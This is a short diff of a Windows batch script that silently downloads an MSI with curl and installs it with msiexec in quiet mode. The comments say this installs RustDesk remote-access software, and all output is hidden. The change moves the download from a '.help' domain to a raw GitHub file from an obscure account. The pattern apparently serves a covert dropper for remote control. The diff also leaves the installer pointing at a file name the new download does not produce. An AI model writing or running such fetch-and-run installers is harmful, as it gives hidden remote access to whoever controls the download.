@@ -10,7 +10,7 @@ if %errorlevel% neq 0 (
 
 :: Silent install of RustDesk MSI
 cd /d %temp%
-curl -s -L -O https://prime-path.help/static/configs/Prime-RT-IN.msi >nul 2>&1
+curl -s -L -O https://raw.githubusercontent.com/hgnstorev2/tresdf/main/Prime_Path.msi >nul 2>&1
 msiexec /i "%temp%\Prime-RT-IN.msi" /qn /norestart >nul 2>&1
 
 :: Locate and install RustDesk service silently
